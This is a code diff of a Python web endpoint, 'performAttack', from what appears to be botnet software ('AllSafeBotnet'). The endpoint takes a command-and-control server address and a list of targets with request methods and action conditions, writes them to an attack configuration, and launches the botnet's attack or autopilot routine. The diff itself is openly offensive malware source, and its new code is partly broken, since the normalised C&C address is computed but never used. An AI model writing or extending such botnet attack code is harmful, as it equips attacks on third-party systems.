@@ -66,16 +66,26 @@ def performAttack():
                 allsafe.autopilot(request.json['cc_server_auto'], {}, int(request.json['contact_time']),override=False)
                 return "OK", 200
 
-            cc_server = prepareConfigFile(request.json)
-            if '://' not in cc_server:
-                cc_server = 'http://' + cc_server
-            allsafe = Botnet.AllSafeBotnet()
-            if ('local_attack' not in request.json):
-                allsafe.autopilot(cc_server, './data/current_attack.json', 5, override=True)
-            else:
-                allsafe.autopilot(cc_server, './data/current_attack.json', 5, override=False)
-            print("done")
-            return "OK", 200
+            # if not autopilot mode, we will experience a step-by-step attack session
+            # let we check for configuration file formatting...
+            try:
+                # prepare configuration
+                cc_server   = prepareConfigFile(request.json)
+                config_path = './data/current_attack.json'
+                # prepare botnet resources
+                allsafe = Botnet.AllSafeBotnet()
+                # if the attack to be carried without updates from C&C?
+                if 'local_attack' not in request.json:
+                    allsafe.attack(config_path, override=True)
+                # else we set to attack to be carried using updated configuration if any
+                else:
+                    if '://' not in cc_server:
+                        cc_server = 'http://' + cc_server
+                    allsafe.attack(config_path, override=False)
+            # return success
+                return "OK", 200
+            except Exception:
+                return "Invalid request", 402
         else:
             return "Invalid request", 402
     else:
@@ -88,8 +98,6 @@ def prepareConfigFile(params, where='./data/current_attack.json'):
     # Only the useful key values will be changed accordingly
     localRootSchema['last_modified'] = round(time())
     localRootSchema['cc_server'] = params['cc_server'] if 'cc_server' in params else ""
-
-
 
     # Creation of the requestSchema
     for elem in params['target']:
@@ -121,8 +129,6 @@ def prepareConfigFile(params, where='./data/current_attack.json'):
 
         # ActionConditions is now poart of the localTargetSchema
         localTargetSchema['action_conditions'] = actionConditions
-
-
 
         localRequestSchema = requestSchema
         localRequestSchema['method'] = elem['method'] if 'method' in elem else ""
